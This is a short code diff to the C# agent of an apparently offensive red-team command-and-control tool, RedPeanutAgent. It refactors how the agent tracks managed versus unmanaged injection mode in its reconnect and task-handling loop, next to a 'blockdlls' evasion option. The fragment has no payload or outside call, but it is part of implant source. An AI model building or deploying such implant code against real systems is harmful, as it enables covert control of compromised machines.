@@ -131,6 +131,7 @@ namespace RedPeanutAgent
         private void Reconnect(string agentid, byte[] aeskey, byte[] aesiv, string param, Core.Utility.CookiedWebClient wc)
         {
             bool connected = false;
+            injectionmanaged = bool.Parse("#MANAGED#");
             while (!connected)
             {
                 try
@@ -221,7 +222,6 @@ namespace RedPeanutAgent
 
             Thread servert = null;
             bool smbstarted = false;
-            bool managed = injectionmanaged;
 
             while (true)
             {
@@ -251,7 +251,7 @@ namespace RedPeanutAgent
                                     {
                                         Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                         Thread commandthread;
-                                        if (managed)
+                                        if (injectionmanaged)
                                         {
                                             commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
                                         }
@@ -327,9 +327,9 @@ namespace RedPeanutAgent
                                     }
                                     break;
                                 case "managed":
-                                    managed = task.InjectionManagedTask.Managed;
+                                    injectionmanaged = task.InjectionManagedTask.Managed;
                                     Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
-                                    commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", managed == true ? "Managed" : "Unmanaged"));
+                                    commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", injectionmanaged == true ? "Managed" : "Unmanaged"));
                                     break;
                                 case "blockdlls":
                                     blockdlls = task.BlockDllsTask.Block;
